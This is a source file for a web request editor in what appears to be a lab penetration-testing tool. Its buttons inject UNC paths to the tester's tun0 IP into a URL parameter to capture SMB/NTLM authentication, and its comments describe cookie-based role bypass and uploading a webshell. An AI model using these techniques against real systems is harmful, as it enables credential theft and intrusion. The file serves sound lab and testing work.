import { useEffect, useRef, useState } from "react";
import { api } from "../../api";
import { GraphRequestDraft } from "./graphModel";
import { S } from "./graphStyles";

type GraphExchange = {
  id: number; status_code?: number | null; duration_ms: number; size: number;
  response_headers: string; error?: string;
};

export function GraphRequestPanel(props: {
  draft: GraphRequestDraft; onBack: () => void;
}) {
  const [method, setMethod] = useState("GET");
  const [url, setUrl] = useState(props.draft.url);
  const [headers, setHeaders] = useState("{}");
  // No cookie field existed here before -- editing cookies meant leaving the
  // graph for the full #web Web Testing page, which already has one. The
  // backend already accepted a cookies dict end to end; this UI was the
  // only missing link (e.g. a role=0 -> role=1 access-control-bypass cookie
  // needs to be set on a request without ever leaving the graph).
  const [cookies, setCookies] = useState("{}");
  const [bodyMode, setBodyMode] = useState<"raw" | "json" | "form" | "multipart">("raw");
  const [body, setBody] = useState("");
  // multipart's own body content is built from these instead of the plain
  // body textarea -- a raw text field can't hold binary file bytes, and
  // this is the one body mode this app had no way to actually send before
  // (e.g. a webshell disguised as an upload -- ReverseShellPanel could
  // already build the file, just never POST it anywhere).
  const [multipartField, setMultipartField] = useState("file");
  const [multipartFile, setMultipartFile] = useState<{ name: string; type: string; b64: string }>();
  const [multipartFields, setMultipartFields] = useState("{}");
  const [confirmed, setConfirmed] = useState(false);
  const [requestId, setRequestId] = useState<number | null>(null);
  const [exchange, setExchange] = useState<GraphExchange | null>(null);
  const [responseBody, setResponseBody] = useState("");
  const [state, setState] = useState<"idle" | "saving" | "sending">("idle");
  const [error, setError] = useState("");
  const [lhost, setLhost] = useState("");
  const urlInput = useRef<HTMLInputElement>(null);
  useEffect(() => {
    let cancelled = false;
    void fetch("/api/vpn/status").then((response) => response.json()).then((data) => {
      const match = /(\d{1,3}\.){3}\d{1,3}/.exec(data.tun0 || "");
      if (match && !cancelled) setLhost(match[0]);
    }).catch(() => undefined);
    return () => { cancelled = true; };
  }, []);
  const insertUncPath = (snippet: string) => {
    const pageParam = /([?&]page=)([^&]*)/.exec(url);
    if (pageParam) {
      const start = pageParam.index + pageParam[1].length;
      setUrl(url.slice(0, start) + snippet + url.slice(start + pageParam[2].length));
      return;
    }
    const start = urlInput.current?.selectionStart ?? url.length;
    const end = urlInput.current?.selectionEnd ?? url.length;
    setUrl(url.slice(0, start) + snippet + url.slice(end));
    requestAnimationFrame(() => {
      const cursor = start + snippet.length;
      urlInput.current?.focus();
      urlInput.current?.setSelectionRange(cursor, cursor);
    });
  };
  const insertSmbDirectPath = () => {
    if (lhost) insertUncPath(`\\\\${lhost}\\test`);
  };
  const pickMultipartFile = (fileList: FileList | null) => {
    const file = fileList?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      const dataUrl = String(reader.result);
      // "data:<mime>;base64,<payload>" -- only the payload after the comma
      // is what the backend's base64.b64decode() wants.
      const b64 = dataUrl.slice(dataUrl.indexOf(",") + 1);
      setMultipartFile({ name: file.name, type: file.type || "application/octet-stream", b64 });
    };
    reader.readAsDataURL(file);
  };

  const requestPayload = () => ({
    project_id: props.draft.projectId, target_id: props.draft.targetId,
    service_id: props.draft.serviceId, name: `${method} ${new URL(url).pathname || "/"}`,
    folder: "Graph", tags: ["graph"], method, url, query: {},
    headers: JSON.parse(headers || "{}"), cookies: JSON.parse(cookies || "{}"),
    body: bodyMode === "multipart" ? JSON.stringify({
      fields: JSON.parse(multipartFields || "{}"),
      files: multipartFile ? [{ field: multipartField, filename: multipartFile.name,
        content_type: multipartFile.type, content_b64: multipartFile.b64 }] : [],
    }) : body,
    body_mode: bodyMode,
    tls_verify: true, proxy: "", timeout: 30, follow_redirects: false,
  });
  const save = async (): Promise<number | null> => {
    setState("saving"); setError("");
    try {
      const saved = await api<{ id: number }>(
        requestId ? `/web/requests/${requestId}` : "/web/requests",
        { method: requestId ? "PUT" : "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestPayload()) },
      );
      setRequestId(saved.id); setState("idle");
      return saved.id;
    } catch (reason) {
      setError(reason instanceof Error ? reason.message : String(reason));
      setState("idle"); return null;
    }
  };
  const send = async () => {
    if (!confirmed) { setError("허가된 실습 대상을 확인해 주세요."); return; }
    const id = requestId || await save();
    if (!id) return;
    setState("sending"); setError(""); setExchange(null); setResponseBody("");
    try {
      const rows = await api<GraphExchange[]>(`/web/requests/${id}/send`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ variables: {}, repeat: 1, confirmed: true }),
      });
      const result = rows.at(-1) || null;
      setExchange(result);
      if (result && !result.error) {
        const response = await fetch(`/api/web/exchanges/${result.id}/body`);
        setResponseBody(await response.text());
      }
    } catch (reason) {
      setError(reason instanceof Error ? reason.message : String(reason));
    } finally { setState("idle"); }
  };
  let responseHeaders = "";
  if (exchange?.response_headers) {
    try { responseHeaders = JSON.stringify(JSON.parse(exchange.response_headers), null, 2); }
    catch { responseHeaders = exchange.response_headers; }
  }

  return <section style={S.requestPanel} aria-label="Graph Web Request">
    <div style={S.requestPanelHead}>
      <div><small style={S.requestEyebrow}>WEB REQUEST</small>
        <h3 style={{ margin: "4px 0 0" }}>요청 편집기</h3></div>
      <button style={S.requestBack} onClick={props.onBack}>← 실행 결과</button>
    </div>
    <div style={S.requestLine}>
      <select value={method} onChange={(e) => setMethod(e.target.value)} style={S.requestMethod}>
        {["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]
          .map((item) => <option key={item}>{item}</option>)}
      </select>
      <input ref={urlInput} aria-label="Request URL" value={url} onChange={(e) => setUrl(e.target.value)}
        style={S.requestUrl} />
      <div style={S.requestTechniqueActions}>
        <button style={S.requestTechniqueButton} disabled={!lhost} onClick={insertSmbDirectPath}
          title={lhost ? `\\\\${lhost}\\test 삽입` : "tun0 IP 확인 중"}>
          SMB Direct Injection 시도
        </button>
        <button style={S.requestTechniqueButton} onClick={() => insertUncPath("\\\\UNKNOWN-SERVER\\share")}
          title="\\\\UNKNOWN-SERVER\\share 삽입">
          LLMNR 시도
        </button>
      </div>
      <button style={S.requestSend} disabled={state !== "idle"}
        onClick={() => void send()}>{state === "sending" ? "전송 중" : "SEND"}</button>
    </div>
    <div style={S.requestGrid}>
      <label style={S.requestField}><span>HEADERS · JSON</span>
        <textarea value={headers} onChange={(e) => setHeaders(e.target.value)} rows={7} /></label>
      <label style={S.requestField}><span>COOKIES · JSON</span>
        <textarea aria-label="Cookies" value={cookies}
          onChange={(e) => setCookies(e.target.value)} rows={7}
          placeholder='{"role": "1"}' /></label>
      <label style={S.requestField}><span>BODY MODE</span>
        <select aria-label="Body mode" value={bodyMode}
          onChange={(e) => setBodyMode(e.target.value as typeof bodyMode)}>
          <option value="raw">raw</option>
          <option value="json">json</option>
          <option value="form">form (x-www-form-urlencoded)</option>
          <option value="multipart">multipart (파일 업로드)</option>
        </select>
      </label>
      {bodyMode === "multipart" ? (
        <label style={S.requestField}><span>파일 업로드</span>
          <input aria-label="업로드 필드명" value={multipartField}
            onChange={(e) => setMultipartField(e.target.value)}
            placeholder="폼 필드명 (예: avatar)" />
          <input aria-label="업로드 파일 선택" type="file"
            onChange={(e) => pickMultipartFile(e.target.files)} />
          {multipartFile && <small>{multipartFile.name} ({multipartFile.type})</small>}
          <textarea aria-label="추가 폼 필드 · JSON" value={multipartFields}
            onChange={(e) => setMultipartFields(e.target.value)} rows={3}
            placeholder='{"submit": "Upload"}' />
        </label>
      ) : (
        <label style={S.requestField}><span>BODY</span>
          <textarea value={body} onChange={(e) => setBody(e.target.value)} rows={7} /></label>
      )}
    </div>
    <div style={S.requestActions}>
      <label><input type="checkbox" checked={confirmed}
        onChange={(e) => setConfirmed(e.target.checked)} /> 허가된 실습 대상임을 확인</label>
      <span style={{ flex: 1 }} />
      {requestId && <span style={S.requestSaved}>SAVED #{requestId}</span>}
      <button style={S.resultAction} disabled={state !== "idle"}
        onClick={() => void save()}>{state === "saving" ? "저장 중…" : "요청 저장"}</button>
    </div>
    {error && <div style={S.resultError}>{error}</div>}
    <div style={S.responsePanel}>
      <div style={S.responseHead}>
        <span>RESPONSE</span>
        {exchange && <b>{exchange.error ? "ERROR" : `HTTP ${exchange.status_code ?? "—"}`}
          <small>{exchange.duration_ms}ms · {exchange.size} bytes</small></b>}
      </div>
      {exchange?.error ? <div style={S.resultError}>{exchange.error}</div>
        : exchange ? <>
          {responseHeaders && <details><summary>응답 헤더</summary>
            <pre style={S.responsePre}>{responseHeaders}</pre></details>}
          <pre style={S.responsePre}>{responseBody || "(빈 응답)"}</pre>
        </> : <div style={S.requestEmpty}>요청을 전송하면 응답이 여기에 표시됩니다.</div>}
    </div>
  </section>;
}
